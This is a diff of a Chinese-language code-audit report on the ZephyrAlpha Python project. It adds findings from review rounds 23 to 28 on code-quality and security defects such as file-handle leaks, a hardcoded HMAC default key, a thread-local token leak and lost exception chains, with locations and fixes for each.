@@ -4,7 +4,7 @@
 > **审核日期**：2026-06-30
 > **审核员**：客观专业架构师（基于4轮深度调研的真实文件证据）
 > **审核方法**：4个并行子agent读真实文件 + Grep真实结果 + AST共享行百分比判定
-> **问题总数**：**1313个唯一违规点**（298初轮 + 52第5轮 + 42第6轮 + 76第7轮 + 60第8轮 + 49第9轮 + 45第10轮 + 98第11轮 + 42第12轮 + 26第13轮 + 54第14轮 + 65第15轮 + 33第16轮 + 16第17轮 + 32第18轮 + 212第19轮 + 70第20轮 + 31第21轮 + 12第22轮新增，去重后），归因于5个病根
+> **问题总数**：**2846个唯一违规点**（298初轮 + 52第5轮 + 42第6轮 + 76第7轮 + 60第8轮 + 49第9轮 + 45第10轮 + 98第11轮 + 42第12轮 + 26第13轮 + 54第14轮 + 65第15轮 + 33第16轮 + 16第17轮 + 32第18轮 + 212第19轮 + 70第20轮 + 31第21轮 + 12第22轮 + 147第23轮 + 781第24轮 + 141第25轮 + 160第26轮 + 140第27轮 + 164第28轮新增，去重后），归因于5个病根
 > **治本方案**：4期施工（仪表盘→AST门禁→批量修复→治理层收敛）
 > **维护规则**：本文档当前由手动调研派生（架构健康度仪表盘为第0期交付物，尚未实现）。违规清单部分需通过调研脚本生成，禁止手工编辑
 
@@ -16,7 +16,7 @@
 - [二、问题总数确定](#二问题总数确定)
 - [三、病根分析（5个根因）](#三病根分析5个根因)
 - [四、战略层裁定（针对100%AI开发）](#四战略层裁定针对100ai开发)
-- [五、1313个问题详细清单](#五1313个问题详细清单)
+- [五、2846个问题详细清单](#五2846个问题详细清单)
   - [5.1 SSoT真源唯一性违规（211个）](#51-ssot真源唯一性违规211个)
   - [5.2 永久系统全自动触发违规（32个）](#52-永久系统全自动触发违规32个)
   - [5.3 新AI可发现性违规（55个）](#53-新ai可发现性违规55个)
@@ -142,6 +142,49 @@
   - [5.123 __contains__/__iter__（2个，第22轮新增）](#5123-containsiter2个第22轮新增)
   - [5.124 __bool__/__len__冲突（2个，第22轮新增）](#5124-boollen冲突2个第22轮新增)
   - [5.125 WeakRef兼容性（1个，第22轮新增）](#5125-weakref兼容性1个第22轮新增)
+  - [5.126 可变默认参数（5个，第23轮新增）](#5126-可变默认参数5个第23轮新增)
+  - [5.127 异常链丢失（6个，第23轮新增）](#5127-异常链丢失6个第23轮新增)
+  - [5.128 文件句柄泄漏（12个，第23轮新增）](#5128-文件句柄泄漏12个第23轮新增)
+  - [5.129 模块级副作用（7个，第23轮新增）](#5129-模块级副作用7个第23轮新增)
+  - [5.130 硬编码凭据（3个，第23轮新增）](#5130-硬编码凭据3个第23轮新增)
+  - [5.131 日志敏感信息泄露（25个，第23轮新增）](#5131-日志敏感信息泄露25个第23轮新增)
+  - [5.132 线程局部存储泄漏（4个，第23轮新增）](#5132-线程局部存储泄漏4个第23轮新增)
+  - [5.133 依赖注入硬编码（85个，第23轮新增）](#5133-依赖注入硬编码85个第23轮新增)
+  - [5.134 返回值不一致（2个，第24轮新增）](#5134-返回值不一致2个第24轮新增)
+  - [5.135 异常粒度过粗（697个，第24轮新增）](#5135-异常粒度过粗697个第24轮新增)
+  - [5.136 死代码检测（11个，第24轮新增）](#5136-死代码检测11个第24轮新增)
+  - [5.137 魔数检测（20个，第24轮新增）](#5137-魔数检测20个第24轮新增)
+  - [5.138 循环引用风险（15个，第24轮新增）](#5138-循环引用风险15个第24轮新增)
+  - [5.139 TODO/FIXME技术债务标记（1个，第24轮新增）](#5139-todofixme技术债务标记1个第24轮新增)
+  - [5.140 函数复杂度过高（15个，第24轮新增）](#5140-函数复杂度过高15个第24轮新增)
+  - [5.141 配置硬编码vs外部化（20个，第24轮新增）](#5141-配置硬编码vs外部化20个第24轮新增)
+  - [5.142 并发原语正确性（8个，第25轮新增）](#5142-并发原语正确性8个第25轮新增)
+  - [5.143 API契约一致性（22个，第25轮新增）](#5143-api契约一致性22个第25轮新增)
+  - [5.144 资源清理顺序（12个，第25轮新增）](#5144-资源清理顺序12个第25轮新增)
+  - [5.145 类型注解完整性（30个，第25轮新增）](#5145-类型注解完整性30个第25轮新增)
+  - [5.146 字符串处理安全（6个，第25轮新增）](#5146-字符串处理安全6个第25轮新增)
+  - [5.147 序列化/反序列化安全（11个，第25轮新增）](#5147-序列化反序列化安全11个第25轮新增)
+  - [5.148 日志级别使用不当（27个，第25轮新增）](#5148-日志级别使用不当27个第25轮新增)
+  - [5.149 线程安全集合使用（25个，第25轮新增）](#5149-线程安全集合使用25个第25轮新增)
+  - [5.150 设计模式误用（17个，第26轮新增）](#5150-设计模式误用17个第26轮新增)
+  - [5.151 错误处理策略一致性（11个，第26轮新增）](#5151-错误处理策略一致性11个第26轮新增)
+  - [5.152 依赖方向违规（39个，第26轮新增）](#5152-依赖方向违规39个第26轮新增)
+  - [5.153 命名一致性（21个，第26轮新增）](#5153-命名一致性21个第26轮新增)
+  - [5.154 接口边界清晰度（14个，第26轮新增）](#5154-接口边界清晰度14个第26轮新增)
+  - [5.155 配置验证完整性（21个，第26轮新增）](#5155-配置验证完整性21个第26轮新增)
+  - [5.156 测试覆盖率盲区（12个，第26轮新增）](#5156-测试覆盖率盲区12个第26轮新增)
+  - [5.157 文档与代码同步深度（25个，第26轮新增）](#5157-文档与代码同步深度25个第26轮新增)
+  - [5.158 循环复杂度（12个，第27轮新增）](#5158-循环复杂度12个第27轮新增)
+  - [5.159 死代码（9个，第27轮新增）](#5159-死代码9个第27轮新增)
+  - [5.160 魔法数字/字符串（27个，第27轮新增）](#5160-魔法数字字符串27个第27轮新增)
+  - [5.161 重复代码块（4个，第27轮新增）](#5161-重复代码块4个第27轮新增)
+  - [5.162 异步代码正确性（34个，第27轮新增）](#5162-异步代码正确性34个第27轮新增)
+  - [5.163 上下文管理器正确性（7个，第27轮新增）](#5163-上下文管理器正确性7个第27轮新增)
+  - [5.164 装饰器误用（3个，第27轮新增）](#5164-装饰器误用3个第27轮新增)
+  - [5.165 全局状态管理（44个，第27轮新增）](#5165-全局状态管理44个第27轮新增)
+  - [5.166 可变默认参数（0个，第28轮新增）](#5166-可变默认参数0个第28轮新增)
+  - [5.167 比较运算正确性（22个，第28轮新增）](#5167-比较运算正确性22个第28轮新增)
+  - [5.168 异常信息泄露（142个，第28轮新增）](#5168-异常信息泄露142个第28轮新增)
 - [六、治本施工方案（4期）](#六治本施工方案4期)
 - [七、客观立场声明](#七客观立场声明)
 
@@ -151,7 +194,7 @@
 
 ZephyrAlpha项目是100%AI开发（trae IDE + AI对话触发），AI上下文有限。项目治理体系设计严谨（trae_060三原则 + 17个reconciler + 52个gate + 34个词表 + CapabilityLookup反查机制），但**执行覆盖存在系统性断层**。
 
-经22轮深度调研（每个子agent读真实文件+Grep真实结果+AST共享行百分比判定），**去重后唯一违规点总数 = 1313个**（298初轮 + 52第5轮 + 42第6轮 + 76第7轮 + 60第8轮 + 49第9轮 + 45第10轮 + 98第11轮 + 42第12轮 + 26第13轮 + 54第14轮 + 65第15轮 + 33第16轮 + 16第17轮 + 32第18轮 + 212第19轮 + 70第20轮 + 31第21轮 + 12第22轮新增），分布在125个维度：
+经28轮深度调研（每个子agent读真实文件+Grep真实结果+AST共享行百分比判定），**去重后唯一违规点总数 = 2846个**（298初轮 + 52第5轮 + 42第6轮 + 76第7轮 + 60第8轮 + 49第9轮 + 45第10轮 + 98第11轮 + 42第12轮 + 26第13轮 + 54第14轮 + 65第15轮 + 33第16轮 + 16第17轮 + 32第18轮 + 212第19轮 + 70第20轮 + 31第21轮 + 12第22轮 + 147第23轮 + 781第24轮 + 141第25轮 + 160第26轮 + 140第27轮 + 164第28轮新增），分布在168个维度：
 
 | 维度 | 违规数 | 高危 | 中危 | 低危 | 核心问题 |
 |---|:---:|:---:|:---:|:---:|---|
@@ -280,9 +323,52 @@ ZephyrAlpha项目是100%AI开发（trae IDE + AI对话触发），AI上下文有
 | __contains__/__iter__（第22轮） | 2 | 0 | 0 | 2 | FindingCollection缺__contains__致`in`回退O(n)+缺__reversed__致reversed()抛TypeError |
 | __bool__/__len__冲突（第22轮） | 2 | 0 | 0 | 2 | GatePipeline在非容器上定义__len__缺__bool__+VerifyResult.__bool__返回非bool值 |
 | WeakRef兼容性（第22轮） | 1 | 0 | 0 | 1 | __slots__类未包含__weakref__，未来若用weakref将抛TypeError |
-| **合计** | **1313** | **578** | **529** | **206** | |
+| 可变默认参数（第23轮） | 5 | 3 | 2 | 0 | task_manager_server.create_task的files_in_scope/deliverables/allowed_touch用=[]默认值致跨调用状态泄漏 |
+| 异常链丢失（第23轮） | 6 | 5 | 1 | 0 | except块内raise新异常未用from e致原始traceback丢失(5处)+from None可能误用(1处) |
+| 文件句柄泄漏（第23轮） | 12 | 3 | 8 | 1 | night_shift_queue等4处Path.open()未用with+rollback_lock等5处os.open异常路径fd泄漏 |
+| 模块级副作用（第23轮） | 7 | 2 | 5 | 0 | 根__init__.py import即启动2个后台线程+migrate脚本模块级sys.path/basicConfig |
+| 硬编码凭据（第23轮） | 3 | 1 | 0 | 2 | cross_session_detector的_DEFAULT_SECRET硬编码HMAC签名密钥(生产路径) |
+| 日志敏感信息泄露（第23轮） | 25 | 0 | 25 | 0 | 25处session_id/token_id记录到日志(运营工作流ID,非认证令牌本体) |
+| 线程局部存储泄漏（第23轮） | 4 | 1 | 2 | 1 | runtime_interceptor的_tls.allowance安全放行令牌跨请求泄漏+span_stub trace上下文泄漏 |
+| 依赖注入硬编码（第23轮） | 85 | 37 | 40 | 8 | AutoRuntimeCore内8处硬编码LLM/VMS+BudgetEngine跨层硬编码12处+sqlite3散点连接35处 |
+| 返回值不一致（第24轮） | 2 | 0 | 1 | 1 | _hash_file类型注解与实际返回不匹配+Optional未导入 |
+| 异常粒度过粗（第24轮） | 697 | 0 | 522 | 175 | 205处except Exception:pass+96处continue+76处GateResult.YELLOW fail-open+141处return空值+4处显式fail-open+175处logged-but-swallowed |
+| 死代码检测（第24轮） | 11 | 0 | 8 | 3 | 7处MIGRATED注释代码块(约95行)+__all__引用幽灵符号+未使用import/变量 |
+| 魔数检测（第24轮） | 20 | 10 | 10 | 0 | task_queue四联魔数+verdict安全阈值+内存压力分级+评分阈值重复+指数退避无上限+max_workers=8散布20+文件 |
+| 循环引用风险（第24轮） | 15 | 7 | 6 | 2 | 根__init__.py Timer延迟规避循环+drift_result_types↔drift_engine包内循环+audit_trail被4处try/except容错 |
+| TODO/FIXME技术债务标记（第24轮） | 1 | 0 | 0 | 1 | 仅1处真实TODO(已关联工单DM-201247)，代码库技术债务标记极清洁 |
+| 函数复杂度过高（第24轮） | 15 | 1 | 9 | 5 | pipeline_orchestrator.dispatch 461行/7层嵌套/30+分支+integration模块贡献8个超标函数 |
+| 配置硬编码vs外部化（第24轮） | 20 | 14 | 4 | 2 | Ollama/DeepSeek URL硬编码4处+模型名硬编码7类+DB路径绕过SSoT+超时值散落+OTLP端点无env兜底 |
+| 并发原语正确性（第25轮） | 8 | 0 | 4 | 4 | pipeline锁双重释放+计数器锁外自增+_dags字典无锁保护+夜班队列ID竞态 |
+| API契约一致性（第25轮） | 22 | 5 | 13 | 4 | LSP违规+Protocol误用为基类+13组重复ABC各自独立_registry致插件发现失败 |
+| 资源清理顺序（第25轮） | 12 | 1 | 9 | 2 | 核心关闭路径无异常隔离+sqlite连接清理缺finally(5文件9方法)+子进程管道关闭顺序错误 |
+| 类型注解完整性（第25轮） | 30 | 12 | 15 | 3 | 34个文件Any滥用>5处(trigger_router 31处)+audit_trail三件套完全无类型+trust_engine隐藏NameError bug |
+| 字符串处理安全（第25轮） | 6 | 0 | 2 | 4 | shell=True命令注入+yaml FullLoader(2文件违反自身策略)+eval弱沙箱+str.format_map属性遍历 |
+| 序列化/反序列化安全（第25轮） | 11 | 1 | 7 | 3 | joblib.load无校验+MCP Content-Length无上限+79+处json.dumps(default=str)类型丢失+SSoT序列化模块from_dict未还原类型 |
+| 日志级别使用不当（第25轮） | 27 | 13 | 10 | 4 | 9处except:pass静默吞没关键失败(服务注册/auto_bootstrap/审计链/资源监控)+4处安全基础设施失败用DEBUG+3处logger.error无exc_info |
+| 线程安全集合使用（第25轮） | 25 | 12 | 11 | 2 | EventBus无锁单例+4处无锁check-then-act共享dict+subscribers list迭代与append竞态+4处无锁单例遗漏双重检查锁定 |
+| 设计模式误用（第26轮） | 17 | 5 | 9 | 3 | God Class 3处(trading/ops核心域)+Shotgun Surgery 4处(同包逐字重复)+Long Parameter List 3处(factories.py) |
+| 错误处理策略一致性（第26轮） | 11 | 3 | 5 | 3 | 同类IO/检索错误混用pass/warning/error多策略+安全关键路径静默吞没+自定义IOError覆盖内建 |
+| 依赖方向违规（第26轮） | 39 | 5 | 25 | 9 | shared底层向上依赖trading/governance 5处HIGH+governance→trading re-export shim 30+文件规模化 |
+| 命名一致性（第26轮） | 21 | 4 | 10 | 7 | 3处幽灵db_path参数(连PG)+同一动作4种命名+CT_XX_XXX违反PascalCase 40个+布尔命名不规范30+字段 |
+| 接口边界清晰度（第26轮） | 14 | 6 | 6 | 2 | 6处下划线私有符号跨模块导入+13处__all__=["*"]规模化误解Python语义 |
+| 配置验证完整性（第26轮） | 21 | 4 | 11 | 6 | HMAC硬编码+完整性校验恒True+int(env)无防护+配置漂移20+处+三层校验同时失效 |
+| 测试覆盖率盲区（第26轮） | 12 | 4 | 5 | 3 | 2处测试因路径错误从不运行+核心业务逻辑无测试+并发代码无并发测试+merkle无篡改检测测试 |
+| 文档与代码同步深度（第26轮） | 25 | 9 | 10 | 6 | 4处连字符vs下划线路径漂移(27文件)+now_iso/utc_now函数名颠倒+版本0.22vs2.0+4处shim缺[DEPRECATED]标记 |
+| 循环复杂度（第27轮） | 12 | 1 | 4 | 7 | exam_orchestrator._compute_metrics_generic复杂度30+/verdict_engine.evaluate 4路分发/scheduler._run_once 5阶段流水线+7个LOW超标函数 |
+| 死代码（第27轮） | 9 | 5 | 1 | 3 | governance/governance错位包7文件+infrastructure/rollback/governance 5文件+governance/_*.py 8错位split+audit_orchestrator 20死重复文件 |
+| 魔法数字/字符串（第27轮） | 27 | 6 | 17 | 4 | task_repo 40+条裸SQL+apply_depgraph 40+SQL+file_task_mapper×4副本+3安全扫描器正则阈值不一致 |
+| 重复代码块（第27轮） | 4 | 1 | 2 | 1 | state_synchronizer↔file_task_mapper×4一致性检查~40行重复+check_registry_parsable跨包复制+now_iso私有复制绕过SSoT |
+| 异步代码正确性（第27轮） | 34 | 8 | 25 | 1 | 6个async MCP tool直调同步SQLite/文件IO+LSG安全网关asyncio.run反模式13处C1+4处C2崩溃+4处C3静默绕过 |
+| 上下文管理器正确性（第27轮） | 7 | 1 | 3 | 3 | ProcessLock.__enter__忽略acquire返回值+5处@contextmanager用except Exception(BaseException时回滚跳过)+_RealSpanBridge双路径未对齐 |
+| 装饰器误用（第27轮） | 3 | 0 | 0 | 3 | 3处自定义装饰器缺@functools.wraps(query_metrics.track/shared.infra.limiter×2)致inspect.signature不可穿透 |
+| 全局状态管理（第27轮） | 44 | 6 | 28 | 10 | ~20处模块级单例无锁double-check+__init__.py import时启Timer+baseline_poisoning_guard完整性链无锁+asyncio+全局状态冲突 |
+| 可变默认参数（第28轮） | 0 | 0 | 0 | 0 | 全代码库遵守T\|None=None哨兵模式，无可变默认参数反模式（零检出维度，证明该规范执行良好） |
+| 比较运算正确性（第28轮） | 22 | 1 | 8 | 13 | 8处浮点==分母守卫（std_dev/pooled_std/older_avg/overall_score）+1处金融场景Sharpe比率std==0+13处哨兵检查风格违规 |
+| 异常信息泄露（第28轮） | 142 | 39 | 66 | 37 | MCP Server通用异常处理器str(exc)直返客户端39处+GovernanceServer 12工具handler系统性{error:f"...:{e}"}+LLM Gateway SDK异常含部分API key+traceback.format_exc存结果对象8处 |
+| **合计** | **2846** | **814** | **1478** | **554** | |
 
-所有1313个问题归因于**5个病根**：
+所有2846个问题归因于**5个病根**：
 1. trae_060的"违规清单"是静态快照，未随项目演进动态更新
 2. 词表→代码的强制消费链存在机械盲区，GATE-VOCAB是"部分强制"
 3. CapabilityLookup是"建议性反查"而非"强制性消费"
@@ -581,7 +667,7 @@ ZephyrAlpha项目是100%AI开发（trae IDE + AI对话触发），AI上下文有
 
 ---
 
-## 五、1313个问题详细清单
+## 五、2846个问题详细清单
 
 ### 5.1 SSoT真源唯一性违规（211个）
 
@@ -7522,6 +7608,1839 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **修复**：对于可能被弱引用的类（如异常类、数据类），在`__slots__`中加入`'__weakref__'`。鉴于项目当前未用weakref，优先级LOW，但应在编码规范中明确：声明`__slots__`时默认包含`'__weakref__'`。
 
 **严重度汇总**：HIGH=0, MEDIUM=0, LOW=1, 合计=1
+
+---
+
+### 5.126 可变默认参数（5个，第23轮新增）
+
+#### 5.126.1 [HIGH] task_manager_server.create_task的files_in_scope/deliverables/allowed_touch用=[]默认值致跨调用状态泄漏
+
+- **文件**：
+  - `src/zephyr/infrastructure/task_manager_server.py:146-148`
+  - `src/zephyr/integration/mcp/task_manager_server.py:135`（重复实现）
+- **问题**：`create_task` MCP工具的3个参数`files_in_scope: list[str] = []`、`deliverables: list[str] = []`、`allowed_touch: list[str] = []`使用可变空列表作为默认值。Python在函数定义时只创建一次这些列表，所有省略对应实参的调用共享同一个列表对象。第210-212行将这3个参数**按引用**直接传入`TaskCard(...)`构造器，TaskCard存储这些引用。若后续代码对`tc.files_in_scope.append(...)`做就地变更，将污染共享默认值，导致未来所有`create_task()`调用继承前一次调用的列表内容——跨任务列表内容污染。
+- **修复**：改为`files_in_scope: list[str] | None = None`，函数体内`if files_in_scope is None: files_in_scope = []`。
+
+#### 5.126.2 [MEDIUM] task_manager_server.create_task的downstream_outputs用=[]默认值
+
+- **文件**：
+  - `src/zephyr/infrastructure/task_manager_server.py:155`
+  - `src/zephyr/integration/mcp/task_manager_server.py:146`
+- **问题**：`downstream_outputs: list = []`同样使用可变默认值。虽未直接存入TaskCard（使用新生成的`[]`），仅用于条件判断与路径解析，泄漏路径较窄，但反模式依然存在。
+- **修复**：同5.126.1，改为`None`哨兵模式。两个文件为重复实现，应统一。
+
+**严重度汇总**：HIGH=3, MEDIUM=2, LOW=0, 合计=5
+
+---
+
+### 5.127 异常链丢失（6个，第23轮新增）
+
+#### 5.127.1 [HIGH] except块内raise新异常未用from e致原始traceback丢失（5处）
+
+- **文件**：
+  - `src/zephyr/trading/trading_contracts/portfolio/contracts/money.py:190-191` — `except Exception as exc: raise MoneyPrecisionError(f"...{exc}）")` 丢失`from exc`
+  - `src/zephyr/shared/contracts/portfolio/money.py:204-205` — 同上（重复实现）
+  - `src/zephyr/security/llm_defense/llm_security/input_sanitizer.py:198-199` — `except ValueError as e: raise CommandInjectionError(f"Unparseable command: {command} ({e})")` 丢失`from e`
+  - `src/zephyr/governance/task_repo.py:819-820` — `except ValueError as exc: raise PostSyncValidationError(task_id, cmd, f"shell 解析失败: {exc}")` 丢失`from exc`
+  - `src/zephyr/security/access_control/orphan_judge/deprecation_tracker.py:134-139` — `except OSError as exc: raise DeprecationTrackerError(f"I/O error...{exc}")` 丢失`from exc`
+- **问题**：这5处在`except ... as e/exc:`块中构造新异常并把原始异常的`str()`嵌入消息，却未使用`raise ... from e`。原始异常的traceback仅通过Python隐式`__context__`保留（显示为"During handling of the above exception..."），而非显式`__cause__`（"The above exception was the direct cause..."），排障时链路不清晰。
+- **修复**：在raise末尾追加`from exc`/`from e`。`money.py`两处为重复实现，应同步修复。
+
+#### 5.127.2 [MEDIUM] from None可能误用致subprocess超时原始traceback被隐藏
+
+- **文件**：`src/zephyr/security/llm_defense/llm_security/process_sandbox.py:263-265`
+- **问题**：`except subprocess.TimeoutExpired: raise SandboxTimeout(cmd, effective_timeout) from None`。`SandboxTimeout`已含cmd/timeout信息，但`from None`彻底隐藏了`TimeoutExpired`的原始traceback，排障时无法看到subprocess内部栈。
+- **修复**：改为`as exc`绑定后`from exc`，或不带`from`让隐式链保留。
+
+**严重度汇总**：HIGH=5, MEDIUM=1, LOW=0, 合计=6
+
+---
+
+### 5.128 文件句柄泄漏（12个，第23轮新增）
+
+#### 5.128.1 [HIGH] Path.open()未用with致循环/glob遍历中句柄耗尽（3处）
+
+- **文件**：
+  - `src/zephyr/trading/night_shift_queue.py:77` — `self._path.open("a", encoding="utf-8").write(line)` 文件对象被立即丢弃，依赖GC回收
+  - `src/zephyr/trading/ai_audit_logger.py:202` — `for line in f.open(encoding="utf-8"):` 外层glob遍历多文件，每个文件打开后未关闭即进入下一次迭代
+  - `src/zephyr/trading/dream_cycle.py:94` — 同上模式，`for line in f.open(encoding="utf-8"):` glob遍历未关闭
+- **问题**：`Path.open()`返回的文件对象未用`with`管理，在循环/glob遍历场景下句柄依赖CPython引用计数回收，非CPython实现下持续泄漏，异常路径下缓冲区可能未flush。
+- **修复**：改为`with self._path.open(...) as f: f.write(line)`或`with f.open(...) as fh: for line in fh:`。
+
+#### 5.128.2 [MEDIUM] 单次Path.open()迭代未关闭（3处）
+
+- **文件**：
+  - `src/zephyr/trading/night_shift_queue.py:85` — `pending()`方法
+  - `src/zephyr/trading/night_shift_queue.py:104` — `resolve()`方法
+  - `src/zephyr/trading/night_shift_queue.py:127` — `stats()`方法
+- **问题**：`for line in self._path.open(encoding="utf-8"):` 单文件迭代未关闭，异常路径下句柄生命周期不确定。
+- **修复**：同5.128.1，改为`with`语句。
+
+#### 5.128.3 [MEDIUM] os.open异常路径fd泄漏（5处）
+
+- **文件**：
+  - `src/zephyr/infrastructure/rollback/rollback_lock.py:124,168`
+  - `src/zephyr/governance/rollback_lock.py:124,168`（重复实现）
+  - `src/zephyr/autonomy_core/skill_locking.py:113`
+- **问题**：`os.open()`返回fd后，`os.write(fd, ...)`若抛`OSError`（磁盘满/配额超限），`os.close(fd)`不会执行，`except`直接return，fd泄漏。`skill_locking.py`的`os.close(fd)`位于`yield`的finally块，但`os.write`异常时永远到达不了try/finally块。
+- **修复**：将`os.write`/`os.close`包入`try/finally`。两份`rollback_lock.py`为重复实现，应统一。
+
+#### 5.128.4 [LOW] safe_open返回裸句柄设计缺陷
+
+- **文件**：`src/zephyr/infrastructure/capacity_assurance/modules/winfs_defense.py:51`
+- **问题**：`safe_open()`返回裸`open()`句柄，调用方必须自行`close()`。当前零调用方，属潜在脚枪。
+- **修复**：改为`@contextmanager`或标记deprecated。
+
+**严重度汇总**：HIGH=3, MEDIUM=8, LOW=1, 合计=12
+
+---
+
+### 5.129 模块级副作用（7个，第23轮新增）
+
+#### 5.129.1 [HIGH] 根__init__.py import即启动2个后台线程
+
+- **文件**：`src/zephyr/__init__.py:125-127,142-144`
+- **问题**：
+  - 行125-127：`_bootstrap_timer = threading.Timer(0.05, _deferred_bootstrap)` + `.start()` 在模块顶层。`import zephyr`即启动后台线程执行`auto_bootstrap.bootstrap()`（monkey-patch SessionContinuity/PhaseManager/BlueprintMetrics）。
+  - 行142-144：`_registration_timer = threading.Timer(0.1, _deferred_service_registration)` + `.start()` 在模块顶层。启动第二个线程执行`register_services()`。
+- **影响**：所有`import zephyr.*`路径（包括测试收集阶段）都触发2个后台线程，线程启动时机不可控、测试不可重入、CI中非确定性行为。
+- **修复**：改为显式`zephyr.bootstrap()`调用或懒触发。
+
+#### 5.129.2 [MEDIUM] 根__init__.py import即读文件+修改os.environ
+
+- **文件**：`src/zephyr/__init__.py:63`
+- **问题**：`_load_dotenv()`在模块顶层调用，函数内读取`.env`文件并`os.environ.setdefault(k, v)`修改进程环境变量。import即触发磁盘I/O+全局env污染，测试环境无法隔离。
+
+#### 5.129.3 [MEDIUM] migrate脚本模块级文件系统探测+sys.path修改+basicConfig
+
+- **文件**：`src/zephyr/integration/vector_memory/migrate_chroma_to_faiss.py:38-45`
+- **问题**：
+  - 行38-40：模块顶层`while not (_repo_root / ".git").exists():`循环探测文件系统
+  - 行41：`sys.path.insert(0, str(_repo_root / "src"))`修改全局sys.path
+  - 行45：`logging.basicConfig(level=logging.INFO, format=...)`修改全局root logger配置
+  - 该文件无`if __name__ == "__main__":`守卫，import即执行全部副作用
+
+#### 5.129.4 [MEDIUM] dashboard app.py模块级sys.path修改
+
+- **文件**：`src/zephyr/security/llm_defense/llm_security/dashboard/app.py:34`
+- **问题**：`sys.path.insert(0, str(project_root))`在模块顶层，import即修改全局sys.path。
+
+**严重度汇总**：HIGH=2, MEDIUM=5, LOW=0, 合计=7
+
+---
+
+### 5.130 硬编码凭据（3个，第23轮新增）
+
+#### 5.130.1 [HIGH] cross_session_detector的_DEFAULT_SECRET硬编码HMAC签名密钥
+
+- **文件**：`src/zephyr/security/access_control/cross_session_detector.py:34`
+- **问题**：模块级`_DEFAULT_SECRET = "zeph***"`硬编码默认密钥，在`__init__`中作为`secret_key`缺省回退值直接用于agent session token的HMAC-SHA256签名与验签。文件标注`[MATURITY] production`、`[DOMAIN] D_SECURITY`，属生产路径代码。若部署时未显式注入`secret_key`（默认调用路径），所有签名使用此公开可知的固定值，攻击者可伪造合法session token签名，绕过跨session盗用检测。
+- **修复**：移除默认值，强制从环境变量/密钥管理服务注入；缺省时抛出显式配置错误。
+
+#### 5.130.2 [LOW] 文档字符串中的API key占位符（2处）
+
+- **文件**：
+  - `src/zephyr/intelligence/model_profiling/deepseek_v4_chat.py:32`
+  - `src/zephyr/intelligence/model_profiling/pipeline_routing/deepseek_v4_chat.py:32`（重复实现）
+- **问题**：模块docstring"用法"示例中出现`api_key="sk-..."`，虽为占位符非真实密钥，但可能被开发者复制粘贴时遗漏替换。
+- **修复**：改为`api_key=os.environ["DEEPSEEK_API_KEY"]`形式的示例。两个文件为重复实现，应合并去重。
+
+**严重度汇总**：HIGH=1, MEDIUM=0, LOW=2, 合计=3
+
+---
+
+### 5.131 日志敏感信息泄露（25个，第23轮新增）
+
+#### 5.131.1 [MEDIUM] token_id记录到日志（1处）
+
+- **文件**：`src/zephyr/security/access_control/emergency_override.py:153`
+- **问题**：`logger.info("EmergencyOverride: token '%s' revoked", token_id)`记录紧急覆盖令牌标识符（格式`EMG-{uuid}`）。虽为标识符而非令牌本体认证值，但按审计标准归类为MEDIUM。
+- **修复**：评估是否需记录完整token_id，考虑脱敏为前4位+`***`。
+
+#### 5.131.2 [MEDIUM] session_id记录到日志（24处）
+
+- **文件**（24处，含重复实现）：
+  - `trading/orchestrator/state/session_manager.py:124,187,271` — 会话生命周期管理（创建/状态转换/移除）
+  - `trading/orchestrator/session_manager.py:140` — 同上（重复实现）
+  - `governance/audit_orchestration/state/session_manager.py:124,187,271` — 同上（重复实现）
+  - `governance/audit_orchestration/session_manager.py:140` — 同上（重复实现）
+  - `trading/session_lifecycle.py:510,530` — 会话持久化/加载失败
+  - `governance/behavioral_admission/session_lifecycle.py:510,530` — 同上（重复实现）
+  - `governance/context_recycling.py:81,87` — 上下文回收
+  - `governance/context_governance/context_recycling.py:81,87` — 同上（重复实现）
+  - `governance/git_commit_gateway.py:365,367` — 网关reconcile
+  - `security/adversarial_validation/validator.py:112` — 对抗验证
+  - `security/access_control/session_concurrency.py:224,235,446` — 会话注册/注销/交接
+  - `infrastructure/_base_server.py:199` — RBAC启用日志
+  - `integration/mcp/_base_server.py:199` — 同上（重复实现）
+- **问题**：24处日志记录session_id。这些session_id均为**运营工作流会话ID**（交易编排器会话、审计会话、RBAC agent会话、进程会话注册等），**非用户认证会话令牌**。实际风险偏向LOW（仅为关联/追溯用ID，无法直接用于身份冒充），但按审计标准"token/会话ID = MEDIUM"归类。其中大量为重复实现文件中的相同日志语句。
+- **修复**：评估session_id是否属于需脱敏的敏感字段。若属于运营追溯ID，可在编码规范中明确豁免；若需脱敏，统一使用前8位+`***`模式。优先合并重复实现文件以减少日志点数量。
+- **正面发现**：`shared/security/secrets.py`已实现`sanitize_secret()`函数（脱敏为`***REDACTED*** (len=N)`），建议将该模式推广至全项目。
+
+**严重度汇总**：HIGH=0, MEDIUM=25, LOW=0, 合计=25
+
+---
+
+### 5.132 线程局部存储泄漏（4个，第23轮新增）
+
+#### 5.132.1 [HIGH] runtime_interceptor的_tls.allowance安全放行令牌跨请求泄漏
+
+- **文件**：`src/zephyr/security/llm_defense/llm_security/runtime_interceptor.py:95`
+- **问题**：`_tls = threading.local()`存储LSG放行令牌`_tls.allowance`（`tuple[float, str]` = 过期时间戳+request_id），授予绕过LSG安全网关直接调用LLM API的权限。TTL默认30s。若`grant_allowance()`被调用后请求异常退出且`revoke_allowance()`未在finally中执行，令牌在线程上存活最长30s。线程池复用该线程处理新请求时，新请求直接调用LLM API会读到上一个请求的未过期令牌——**跨请求安全上下文泄漏**，绕过RULE-LSG-001安全网关。全代码库无请求边界重置`_tls`的逻辑。
+- **修复**：在请求边界（中间件/拦截器入口）重置`_tls`；或将同步路径也改为`contextvars`（与异步路径一致）。
+
+#### 5.132.2 [MEDIUM] sqlite_metadata_store的_local.conn在线程池中泄漏
+
+- **文件**：`src/zephyr/integration/vector_memory/sqlite_metadata_store.py:119`
+- **问题**：`self._local.conn`按线程懒创建sqlite连接。`close()`方法只关闭调用线程的conn。若store在N个线程的线程池中被访问，产生N个连接，但`close()`只关1个，其余N-1个连接泄漏（文件句柄、WAL锁持有）。连接使用`check_same_thread=False`却又用`_local`做每线程独立连接——设计自相矛盾。
+- **修复**：要么统一用单连接+`check_same_thread=False`，要么`close()`遍历所有线程连接。
+
+#### 5.132.3 [MEDIUM] span_stub的_THREAD_LOCAL._span_stack跨请求泄漏
+
+- **文件**：`src/zephyr/infrastructure/system_telemetry/traces/span_stub.py:168`
